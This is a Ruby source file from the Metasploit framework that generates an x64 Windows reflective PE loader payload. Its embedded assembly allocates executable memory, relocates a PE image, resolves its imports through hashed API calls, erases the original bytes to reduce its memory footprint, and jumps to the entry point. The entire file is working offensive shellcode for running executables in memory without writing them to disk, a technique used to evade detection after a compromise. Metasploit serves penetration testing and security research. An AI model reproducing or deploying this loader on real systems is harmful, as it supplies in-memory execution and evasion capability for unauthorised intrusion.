# -*- coding: binary -*-

module Msf
  module Payload::Windows::ReflectivePELoader_x64
    include Payload::Windows::BlockApi_x64
    def asm_reflective_pe_loader_x64(opts)

      prologue = ''
      if opts[:is_dll] == true
        prologue = %(
  mov rcx,r13                     ; hinstDLL
  mov rdx,0x01                    ; fdwReason
  xor r8,r8                       ; lpReserved
      )
      end

      %^
stub:
  pop rsi                         ; Get the address of image to rsi
  call $+5                        ; Push the current RIP value to stack
  cld                             ; Clear direction flags
  sub [rsp],rsi                   ; Subtract the address of pre mapped PE image and get the image_size+8 to ST[0]
  mov rbp,rsp                     ; Copy current stack address to rbp
  and rbp,-0x1000                 ; Create a new shadow stack address
  mov eax,dword [rsi+0x3C]        ; Get the offset of "PE" to eax
  mov rbx,qword [rax+rsi+0x30]    ; Get the image base address to rbx
  mov r12d,dword [rax+rsi+0x28]   ; Get the address of entry point to r12
  mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
  mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
  mov rdx,[rsp]                   ; dwSize
  xor rcx,rcx                     ; lpAddress
  xchg rsp,rbp                    ; Swap shadow stack
  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
  call api_call                   ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  xchg rsp,rbp                    ; Swap shadow stack
  mov rdi,rax                     ; Save the new base address to rdi
  xor rax,rax                     ; Zero out the RAX
  xor r8,r8                       ; Zero out the R8
  xor r13,r13                     ; Zero out the R13
  xor r14,r14                     ; Zero out the R14
  mov eax,dword [rsi+0x3C]        ; Offset to IMAGE_NT_HEADER ("PE")
  mov ecx,dword [rax+rsi+0xB4]    ; Base relocation table size
  mov eax,dword [rax+rsi+0xB0]    ; Base relocation table RVA
  add rax,rsi                     ; Base relocation table memory address
  add rcx,rax                     ; End of base relocation table
calc_delta:
  mov rdx,rdi                     ; Move the new base address to rdx
  sub rdx,rbx                     ; Delta value
  mov r13d,dword [rax]            ; Move the reloc RVA to R13D
  mov r14d,dword [rax+4]          ; Move the reloc table size to R14D
  add rax,0x08                    ; Move to the reloc descriptor
  jmp fix                         ; Start fixing
get_rva:
  cmp rcx,rax                     ; Check if the end of the reloc section
  jle reloc_fin                   ; If yes goto fin
  mov r13d,dword [rax]            ; Move the new reloc RVA
  mov r14d,dword [rax+4]          ; Move the new reloc table size
  add rax,0x08                    ; Move 8 bytes
fix:
  cmp r14w,0x08                   ; Check if the end of the reloc block
  jz get_rva                      ; If yes set the next block RVA
  mov r8w,word [rax]              ; Move the reloc desc to r8w
  cmp r8w, 0x00                   ; Check if it is a padding word
  je pass                         ; Pass padding bytes
  and r8w,0x0FFF                  ; Get the last 12 bits
  add r8d,r13d                    ; Add block RVA to desc value
  add r8,rsi                      ; Add the start address of the image
  add [r8],rdx                    ; Add the delta value to calculated absolute address
pass:
  sub r14d,0x02                   ; Decrease the index
  add rax,0x02                    ; Move to the next reloc desc.
  xor r8,r8                       ; Zero out r8
  jmp fix                         ; Loop
reloc_fin:                        ; All done !
  xor r14,r14                     ; Zero out r14
  xor r15,r15                     ; Zero out r15
  xor rcx,rcx                     ; Zero out rcx
  mov eax,dword [rsi+0x3C]        ; Offset to IMAGE_NT_HEADER ("PE")
  mov eax,dword [rax+rsi+0x90]    ; Import table RVA
  add rax,rsi                     ; Import table memory address (first image import descriptor)
  push rax                        ; Save import descriptor to stack
get_modules:
  cmp dword [rax],0               ; Check if the import names table RVA is NULL
  jz complete                     ; If yes building process is done
  mov ecx,dword [rax+0x0C]        ; Get RVA of dll name to eax
  add rcx,rsi                     ; Get the dll name address
  call LoadLibraryA               ; Load the library
  mov r13,rax                     ; Move the dll handle to R13
  mov rax,[rsp]                   ; Move the address of current _IMPORT_DESCRIPTOR to eax
  call get_procs                  ; Resolve all windows API function addresses
  add dword [rsp],0x14            ; Move to the next import descriptor
  mov rax,[rsp]                   ; Set the new import descriptor address to eax
  jmp get_modules                 ; Get other modules
get_procs:
  mov r14d,dword [rax+0x10]       ; Save the current import descriptor IAT RVA
  add r14,rsi                     ; Get the IAT memory address
  mov rax,[rax]                   ; Set the import names table RVA to eax
  add rax,rsi                     ; Get the current import descriptor's import names table address
  mov r15,rax                     ; Save &INT to R15
resolve:
  cmp dword [rax],0x00            ; Check if end of the import names table
  jz all_resolved                 ; If yes resolving process is done
  mov rax,[rax]                   ; Get the RVA of function hint to eax
  btr rax,63                      ; Check if the high order bit is set
  jnc name_resolve                ; If high order bit is not set resolve with INT entry
  shl rax,2                       ; Discard the high bit by shifting
  shr rax,2                       ; Shift back the original value
  call GetProcAddress             ; Get the API address with hint
  jmp insert_iat                  ; Insert the address of API tı IAT
name_resolve:
  add rax,rsi                     ; Set the address of function hint
  add rax,0x02                    ; Move to function name
  call GetProcAddress             ; Get the function address to eax
insert_iat:
  mov [r14],rax                   ; Insert the function address to IAT
  add r14,0x08                    ; Increase the IAT index
  add r15,0x08                    ; Increase the import names table index
  mov rax,r15                     ; Set the address of import names table address to eax
  jmp resolve                     ; Loop
all_resolved:
  mov qword [r14],0x00            ; Insert a NULL dword
  ret                             ; <-
LoadLibraryA:
  ;mov rcx,rax                     ; Move the address of library name string to RCX
  xchg rbp,rsp                     ; Swap shadow stack
  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
  call api_call                   ; LoadLibraryA(RCX)
  xchg rbp,rsp                    ; Swap shadow stack
  ret                             ; <-
GetProcAddress:
  xchg rbp,rsp                    ; Swap shadow stack
  mov rcx,r13                     ; Move the module handle to RCX as first parameter
  mov rdx,rax                     ; Move the address of function name string to RDX as second parameter
  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
  call api_call                   ; GetProcAddress(ebx,[esp+4])
  xchg rbp,rsp                    ; Swap shadow stack
  ret                             ; <-
complete:
  pop rax                         ; Clean out the stack
  pop rcx                         ; Pop the ImageSize into RCX
  push rdi                        ; Save ImageBase to stack
  mov r13,rdi                     ; Copy the new base value to r13
  add r13,r12                     ; Add the address of entry value to new base address
memcpy:
  mov al,[rsi]                    ; Move 1 byte of PE image to AL register
  mov [rdi],al                    ; Move 1 byte of PE image to image base
  mov byte [rsi],0x00             ; Overwrite copied byte (for less memory footprint)
  inc rsi                         ; Increase PE image index
  inc rdi                         ; Increase image base index
  loop memcpy                     ; Loop until zero
PE_start:
  pop r13                         ; Pop the image base to r13
  or rcx,-1                       ; hProcess
  xor rdx,rdx                     ; lpBaseAddress
  xor r8,r8                       ; hProcess
  xchg rbp,rsp                    ; Swap shadow stack
  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'FlushInstructionCache')}
  call api_call                   ; FlushInstructionCache(0xffffffff,NULL,NULL);
  #{prologue}
  add r13,r12                     ; Add the address of entry value to image base
  call r13                        ; Call the AOE
  and rsp,-0x10                   ; Align stack
  mov rcx,0x00                    ; dwExitCode
  mov r10d,#{'0x%.8x' % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
  call api_call                   ; Call exit funk based on exit_type
  #{asm_block_api}
      ^
    end
  end
end
